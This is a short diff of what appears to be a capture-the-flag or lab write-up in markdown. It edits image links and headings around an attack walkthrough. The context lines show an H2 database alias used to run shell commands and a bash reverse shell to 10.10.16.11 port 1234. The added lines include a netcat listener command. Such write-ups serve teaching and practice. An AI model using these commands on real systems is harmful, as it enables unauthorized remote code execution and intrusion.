@@ -67,10 +67,11 @@ CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOExcep
 $$;
 CALL SHELLEXEC('bash -i &>/dev/tcp/10.10.16.11/1234 0>&1 &')
 ```
+**Firing up our http server**
 
+![](https://i.ibb.co/synM0x0/image.png)
 
-
-![]()
+**Netcat as our listner ```ruby nc -nlvp 1234 ```**
 ![]()
 ![]()
 ![]()
